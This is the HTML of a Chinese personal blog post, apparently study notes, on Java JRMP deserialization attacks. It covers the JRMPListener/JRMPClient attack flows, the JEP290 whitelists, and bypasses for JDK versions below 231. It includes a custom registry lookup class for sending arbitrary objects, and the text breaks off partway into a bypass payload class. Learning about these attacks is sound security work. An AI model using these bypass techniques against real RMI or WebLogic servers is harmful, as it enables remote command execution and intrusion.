@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"baicany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="java学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jrmp反序列化">
+<meta property="og:url" content="https://baicany.github.io/2023/07/30/jrmp/index.html">
+<meta property="og:site_name" content="baicany">
+<meta property="og:description" content="java学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://baicany.github.io/images/a12.jpg">
+<meta property="article:published_time" content="2023-07-29T16:30:01.000Z">
+<meta property="article:modified_time" content="2023-09-01T14:17:49.637Z">
+<meta property="article:author" content="baicany">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baicany.github.io/images/a12.jpg">
+
+
+<link rel="canonical" href="https://baicany.github.io/2023/07/30/jrmp/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"https://baicany.github.io/2023/07/30/jrmp/","path":"2023/07/30/jrmp/","title":"jrmp反序列化"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>jrmp反序列化 | baicany</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">baicany</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome my world !</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#JRMP"><span class="nav-number">1.</span> <span class="nav-text">JRMP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="nav-number"></span> <span class="nav-text">绕过思路</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JRMP-Listener-Client"><span class="nav-number"></span> <span class="nav-text">JRMP Listener&#x2F;Client</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8EJRMP%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%A6%82%E4%B8%8B"><span class="nav-number"></span> <span class="nav-text">关于JRMP的两种攻击流程如下</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number"></span> <span class="nav-text">第一种攻击方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number"></span> <span class="nav-text">第二种攻击方式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-1"><span class="nav-number"></span> <span class="nav-text">第一种攻击方式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-1"><span class="nav-number"></span> <span class="nav-text">第二种攻击方式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JEP290%E7%AD%96%E7%95%A5"><span class="nav-number"></span> <span class="nav-text">JEP290策略</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#checkAccess%E9%99%90%E5%88%B6"><span class="nav-number"></span> <span class="nav-text">checkAccess限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-number"></span> <span class="nav-text">反序列化过滤器</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ObjectInputStream-filterCheck%E7%99%BD%E5%90%8D%E5%8D%95%E6%A0%A1%E9%AA%8C"><span class="nav-number"></span> <span class="nav-text">ObjectInputStream#filterCheck白名单校验</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DGC%E7%99%BD%E5%90%8D%E5%8D%95%E6%A3%80%E9%AA%8C"><span class="nav-number"></span> <span class="nav-text">DGC白名单检验</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JAVA-JEP290%E7%9A%84%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BB"><span class="nav-number"></span> <span class="nav-text">JAVA JEP290的绕过攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%88%E5%AF%B9CheckAccess%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BB-jdk231"><span class="nav-number"></span> <span class="nav-text">针对CheckAccess绕过攻击 &lt; jdk231</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9CheckAccess%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%BC%94%E7%A4%BA"><span class="nav-number"></span> <span class="nav-text">针对CheckAccess绕过攻击环境演示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#filterCheck%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BBUnicastRef%E7%B1%BB-jdk231"><span class="nav-number"></span> <span class="nav-text">filterCheck绕过攻击UnicastRef类 &lt; jdk231</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF%E4%B8%AD%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E7%9A%84"><span class="nav-number"></span> <span class="nav-text">CTF中可能出现的</span></a></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baicany"
+      src="/images/head.jpg">
+  <p class="site-author-name" itemprop="name">baicany</p>
+  <div class="site-description" itemprop="description">web小菜狗一枚</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  <div class="post-gallery" itemscope itemtype="http://schema.org/ImageGallery">
+    
+    <div class="post-gallery-image">
+      <img src="https://baicany.github.io/images/a12.jpg" itemprop="contentUrl">
+    </div>
+    </div>
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://baicany.github.io/2023/07/30/jrmp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="baicany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baicany">
+      <meta itemprop="description" content="web小菜狗一枚">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="jrmp反序列化 | baicany">
+      <meta itemprop="description" content="java学习">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          jrmp反序列化
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-07-30 00:30:01" itemprop="dateCreated datePublished" datetime="2023-07-30T00:30:01+08:00">2023-07-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-09-01 22:17:49" itemprop="dateModified" datetime="2023-09-01T22:17:49+08:00">2023-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">java学习</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h4 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h4><p>RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，基于TCP&#x2F;IP之上，RMI协议之下，当需要进行RMI远程方法调用通信的时候要求服务端与客户端都为Java编写。</p>
+<p>这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范，RMI底层默认使用的JRMP进行传递数据，并且JRMP协议只能作用于RMI协议。</p>
+<p>当然RMI支持的协议除了JRMP还有IIOP协议，而在Weblogic里面的T3协议就是基于RMI去进行实现的。</p>
+<p>JRMP协议(Java Remote Message Protocol)：RMI专用的Java远程消息交换协议。</p>
+<p>IIOP协议(Internet Inter-ORB Protocol) ：基于 CORBA 实现的对象请求代理协议。</p>
+<h3 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h3><p>前面是使用的类将payload进行封装这种方法在后面的补丁中已经将前面两个用到的补丁给拉入了黑名单，而在该漏洞中使用采用了远程的方式来进行命令执行。我们会在服务器搭建一个JRMPListener服务，然后通过T3协议发送payload，使得weblogic自动请求我们的JRMPListener，而在这时候JRMPListener会返回一个gadgets对象。JRMP基于RMI之下的协议，在传输过程其实传输的序列化数据，在接收完成后会去进行反序列化操作。这么在返回gadgets对象的时候，就会对我们的gadgets对象进行反序列化。达到命令执行的效果。也绕过了黑名单的限制。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/14934168.html">https://www.cnblogs.com/zpchcbd/p/14934168.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14275298.html">https://www.cnblogs.com/nice0e3/p/14275298.html</a></p>
+<h1 id="JRMP-Listener-Client"><a href="#JRMP-Listener-Client" class="headerlink" title="JRMP Listener&#x2F;Client"></a>JRMP Listener&#x2F;Client</h1><h2 id="关于JRMP的两种攻击流程如下"><a href="#关于JRMP的两种攻击流程如下" class="headerlink" title="关于JRMP的两种攻击流程如下"></a>关于JRMP的两种攻击流程如下</h2><h3 id="第一种攻击方式"><a href="#第一种攻击方式" class="headerlink" title="第一种攻击方式"></a>第一种攻击方式</h3><p>个人理解：基于RMI的反序列化中的客户端打服务端的类型</p>
+<p>我们需要先发送指定的payload（JRMPListener）到存在漏洞的服务器中，使得该服务器反序列化完成我们的payload后会开启一个RMI的服务监听在设置的端口上。</p>
+<p>我们还需要在我们自己的服务器使用exploit（JRMPClient）与存在漏洞的服务器进行通信，并且发送一个利用链，达到一个命令执行的效果。</p>
+<p>简单来说就是将一个payload（JRMPListener）发送到存在漏洞的服务器，存在漏洞的服务器反序列化操作该payload（JRMPListener）过后会在指定的端口开启RMI监听，然后再通过exploit（JRMPClient） 去发送利用链载荷，最终在存在漏洞的服务器上进行反序列化操作。</p>
+<h3 id="第二种攻击方式"><a href="#第二种攻击方式" class="headerlink" title="第二种攻击方式"></a>第二种攻击方式</h3><p>个人理解：基于RMI的反序列化中的服务端打客户端的类型，这种攻击方式在实战中比较常用</p>
+<p>将exploit（JRMPListener）作为攻击方进行监听。</p>
+<p>我们发送指定的payloads（JRMPClient）使得存在漏洞的服务器向我们的exploit（JRMPListener）进行连接，连接后exploit（JRMPListener）则会返回给存在漏洞的服务器序列化的对象，而存在漏洞的服务器接收到了则进行反序列化操作，从而进行命令执行的操作。</p>
+<p>PS：这里的payload和exploit就是指的不同包下的JRMPListener和JRMPClient！</p>
+<h1 id="第一种攻击方式-1"><a href="#第一种攻击方式-1" class="headerlink" title="第一种攻击方式"></a>第一种攻击方式</h1><p>payloads&#x2F;JRMPListener+exploit&#x2F;JRMPClient（客户端打服务端类型）</p>
+<p>这里的话了解原理就从代码层面入手，这里学习的还是ysoserial的实现，这里先看playloads&#x2F;JRMPListener的实现，这里也就是第一种攻击方式，最终的实现效果就是 使得对方存在反序列化漏洞的服务器上启动RMI服务，使得我们能够发送攻击数据。</p>
+<p>当前面的payloads&#x2F;JRMPListener作用了之后，那么对方就已经开启了RMI服务，我们就可以通过exploit&#x2F;JRMPClient发送gadgets来进行利用了（前提对方存在可以利用的gadgets）</p>
+<h1 id="第二种攻击方式-1"><a href="#第二种攻击方式-1" class="headerlink" title="第二种攻击方式"></a>第二种攻击方式</h1><ol>
+<li>RMIRegistryExploit是客户端发起RMI通信并发送恶意payload到正常注册中心（服务端），注册中心反序列化并执行恶意命令。</li>
+<li>受害机第一次反序列化payloads.JRMPClient后向exploit.JRMPListener（相当于恶意注册中心）发起正常RMI通信，exploit.JRMPListener（恶意注册中心）发送恶意payload到客户端（受害机），客户端（受害机）第二次反序列化，执行真正的恶意命令。</li>
+<li>RMI可以被反打，因为JRMP可以对打。</li>
+</ol>
+<h1 id="JEP290策略"><a href="#JEP290策略" class="headerlink" title="JEP290策略"></a>JEP290策略</h1><h2 id="checkAccess限制"><a href="#checkAccess限制" class="headerlink" title="checkAccess限制"></a>checkAccess限制</h2><p>首先先看对于注册端的sun.rmi.registry.RegistryImpl_Skel#dispatch的限制，加上了相关checkAccess方法的限制，该方法限制了bind&#x2F;rebind&#x2F;unbind等操作只能在本地进行，无法通过远程来进行bind&#x2F;rebind&#x2F;unbind，而其中的lookup和list还是可以远程操作</p>
+<p>CheckAccess的策略有什么用呢？使得RMI服务，注册端和服务端需要在同一个地址上，比如下面的服务端绑定注册端服务的操作，可以看到就存在<code>RegistryImpl.checkAccess(&quot;Registry.bind&quot;);</code></p>
+<p>首先先看对于注册端的sun.rmi.registry.RegistryImpl_Skel#dispatch的限制，加上了相关checkAccess方法的限制，该方法限制了bind&#x2F;rebind&#x2F;unbind等操作只能在本地进行，无法通过远程来进行bind&#x2F;rebind&#x2F;unbind，而其中的lookup和list还是可以远程操作</p>
+<p>CheckAccess的策略有什么用呢？使得RMI服务，注册端和服务端需要在同一个地址上，比如下面的服务端绑定注册端服务的操作，可以看到就存在<code>RegistryImpl.checkAccess(&quot;Registry.bind&quot;);</code></p>
+<p>获取客户端请求的ip，然后进行对比，如果是本地地址的话则进行存储allowedAccessCache，但是如果不是本地地址并且不在allowedAccessCache则直接抛出AccessException错误</p>
+<h2 id="反序列化过滤器"><a href="#反序列化过滤器" class="headerlink" title="反序列化过滤器"></a>反序列化过滤器</h2><h3 id="ObjectInputStream-filterCheck白名单校验"><a href="#ObjectInputStream-filterCheck白名单校验" class="headerlink" title="ObjectInputStream#filterCheck白名单校验"></a>ObjectInputStream#filterCheck白名单校验</h3><p>RMI通信反序列化新增了java.io.ObjectInputStream#filterCheck，只有符合如下的类的才能够允许RMI通信反序列化，否则直接抛出异常</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">return</span> <span class="string">String.class</span> <span class="type">!=</span> <span class="string">var2</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!Number.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!Remote.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!Proxy.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!UnicastRef.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!RMIClientSocketFactory.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!RMIServerSocketFactory.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!ActivationID.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!UID.class.isAssignableFrom(var2)</span> <span class="string">?</span> <span class="attr">Status.REJECTED :</span> <span class="string">Status.ALLOWED</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="DGC白名单检验"><a href="#DGC白名单检验" class="headerlink" title="DGC白名单检验"></a>DGC白名单检验</h3><p>DGCImpl_Skel和DGCImpl_Stub里面的对象反序列化时会进行白名单校验，只有符合如下的类的才能够允许反序列化，否则直接抛出异常</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (clazz == ObjID.<span class="keyword">class</span> ||</span><br><span class="line">                 clazz == UID.<span class="keyword">class</span> ||</span><br><span class="line">                 clazz == VMID.<span class="keyword">class</span> ||</span><br><span class="line">                 clazz == Lease.<span class="keyword">class</span>)</span><br><span class="line">                 ? ObjectInputFilter.Status.ALLOWED</span><br><span class="line">                 : ObjectInputFilter.Status.REJECTED;</span><br></pre></td></tr></table></figure>
+
+<h1 id="JAVA-JEP290的绕过攻击"><a href="#JAVA-JEP290的绕过攻击" class="headerlink" title="JAVA JEP290的绕过攻击"></a>JAVA JEP290的绕过攻击</h1><p>分成两个部分，分别是filterCheck和CheckAccess的绕过</p>
+<h2 id="针对CheckAccess绕过攻击-jdk231"><a href="#针对CheckAccess绕过攻击-jdk231" class="headerlink" title="针对CheckAccess绕过攻击 &lt; jdk231"></a>针对CheckAccess绕过攻击 &lt; jdk231</h2><p>其实这个策略只对于攻击注册端的保护，这样子的话我们就无法进行远程绑定对象，也就不能通过客户端去攻击注册端</p>
+<p>排除以上的，想绕过的话需要怎么绕过？观察sun.rmi.registry.RegistryImpl_Skel#dispatch，你会发现，其实在RegistryImpl_Skel中的lookup方法还是没有被进行checkAccess的操作的</p>
+<p>为什么JEP290没有给lookup本身没有进行checkAccess，原因就是lookup本来功能就是远程接口调用，自然不可能checkAccess，要不然就违背远程调用的意义了</p>
+<p><img src="https://baicany.github.io/images/1586953-20221003135842114-1979885251.png" alt="img"></p>
+<p>参考ysomap中的实现，可以在ysoserial中自己实现一个lookup方法，使它接受Remote对象作为参数，如下JEP_Naming.java代码所示</p>
+<p>这里可能有疑问为什么有原生Naming.java，为什么我们还要自定义写一个呢？这里可以先看下原生Naming.java中的lookup方法实际上是调用sun.rmi.registry.RegistryImpl_Stub#lookup</p>
+<p>而该sun.rmi.registry.RegistryImpl_Stub#lookup方法写入的时候只能写入String</p>
+<p><img src="https://baicany.github.io/images/1586953-20221003164113202-325007601.png" alt="img"></p>
+<p>我们为了触发sun.rmi.registry.RegistryImpl#lookup中var7 &#x3D; (String)var8.readObject();的反序列化readObject操作，就需要将其写入的为我们自定义的Object对象，所以重新写了一个JEP_Naming来写入Object对象</p>
+<p><img src="https://baicany.github.io/images/1586953-20221003164205286-1073033733.png" alt="img"></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">JEP_Naming</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Disallow anyone from creating one of these</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">JEP_Naming</span>()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">lookup</span>(<span class="params">Registry registry, Object obj</span>)</span></span><br><span class="line"><span class="function">        throws Exception</span> &#123;</span><br><span class="line">        RemoteRef <span class="keyword">ref</span> = (RemoteRef) Reflections.getFieldValue(registry, <span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        <span class="built_in">long</span> interfaceHash = Long.valueOf(String.valueOf(Reflections.getFieldValue(registry, <span class="string">&quot;interfaceHash&quot;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        java.rmi.server.Operation[] operations = (Operation[]) Reflections.getFieldValue(registry, <span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        java.rmi.server.RemoteCall call = <span class="keyword">ref</span>.newCall((java.rmi.server.RemoteObject) registry, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.ObjectOutput <span class="keyword">out</span> = call.getOutputStream();</span><br><span class="line">                <span class="comment">//反射修改enableReplace</span></span><br><span class="line">                Reflections.setFieldValue(<span class="keyword">out</span>, <span class="string">&quot;enableReplace&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">out</span>.writeObject(obj); <span class="comment">// arm obj</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">ref</span>.invoke(call);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | RemoteException | NotBoundException e) &#123;</span><br><span class="line">            <span class="keyword">if</span>(e instanceof RemoteException| e instanceof ClassCastException)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.lang.Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.UnexpectedException(<span class="string">&quot;undeclared checked exception&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">ref</span>.done(call);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>JRMPClient_bypass_jep_jdk231.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient_bypass_jep_jdk231</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Remote&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Remote <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span 